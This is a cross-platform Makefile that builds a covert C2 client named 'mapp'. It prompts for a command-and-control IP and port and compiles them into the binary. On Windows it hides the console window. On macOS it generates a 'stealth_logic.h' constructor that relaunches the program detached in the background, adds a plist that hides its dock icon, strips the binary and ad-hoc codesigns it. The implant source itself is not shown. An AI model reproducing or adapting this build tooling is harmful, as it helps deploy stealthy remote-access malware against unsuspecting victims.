CC = gcc
SRC = main.c
TARGET = mapp
BIN = $(TARGET)


define wininput
ifeq ($(C2_IP),)
C2_IP:=$(shell cmd /v:on /c "set /p X=IP: >con & echo !X!")
endif
ifeq ($(C2_PORT),)
C2_PORT:=$(shell cmd /v:on /c "set /p X=PORT: >con & echo !X!")
endif
endef

define uninput
ifeq ($(C2_IP),)
C2_IP := $$(shell sh -c 'read -p "IP: " t; echo $$$$t')
endif
ifeq ($(C2_PORT),)
C2_PORT := $$(shell sh -c 'read -p "PORT: " t; echo $$$$t')
endif
endef


# 检查是否有 cl.exe，有则用 cl，没有则用 gcc
ifneq ($(findstring cl,$(shell where cl 2>nul)),)
CC := cl
else
CC := gcc
endif


all:
ifeq ($(OS),Windows_NT)
	$(eval $(call wininput))
ifneq ($(findstring Microsoft,$(shell $(CC) /? 2>&1)),) # Microsoft Visual Studio (MSVC)
	$(CC) $(SRC) /Fe:$(BIN).exe /O1 /DNDEBUG /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT) /link /subsystem:windows ws2_32.lib
else
ifeq ($(findstring MSYS,$(shell uname -s)),MSYS) # MSYS/MSYS2
	$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
endif
ifeq ($(shell uname -s),Windows_NT) # W32/64devkit
	$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
endif
ifeq ($(findstring cygwin,$(shell uname -s)),cygwin) # Cygwin
	$(CC) $(SRC) -o $(BIN) -Os -s -mwindows -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
endif
endif
endif


else
ifeq ($(shell uname -s),Linux)
	$(eval $(call uninput))
	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
endif
ifeq ($(findstring Darwin,$(shell uname -s)),Darwin)
	$(eval $(call uninput))
	@printf '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>LSUIElement</key><true/></dict></plist>' > temp.plist
	
	@printf '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <libgen.h>\n#include <mach-o/dyld.h>\n\
	__attribute__((constructor)) static void init() { \
		if (getenv("ST_ACT")) return; \
		char path[1024]; uint32_t size = sizeof(path); \
		if (_NSGetExecutablePath(path, &size) != 0) return; \
		chdir(dirname(path)); \
		setenv("ST_ACT", "1", 1); \
		char cmd[2048]; \
		sprintf(cmd, "nohup \\"%%s\\" > /dev/null 2>&1 & disown", path); \
		system(cmd); \
		exit(0); \
	}' > stealth_logic.h

	$(CC) $(SRC) -o $(BIN) -Os -include stealth_logic.h -Wl,-sectcreate,__TEXT,__info_plist,temp.plist -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
	@rm -rf stealth_logic.h temp.plist
	@strip $(BIN) 2>/dev/null || true
	@codesign -s - --force $(BIN) 2>/dev/null || true
endif
ifeq ($(shell uname -s),BSD)
	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
endif
endif

clean:
ifeq ($(OS),Windows_NT)
	cmd /c erase /f /s /q $(BIN) $(BIN).*
else
	sh -c "rm -rf $(BIN) $(BIN).*"
endif
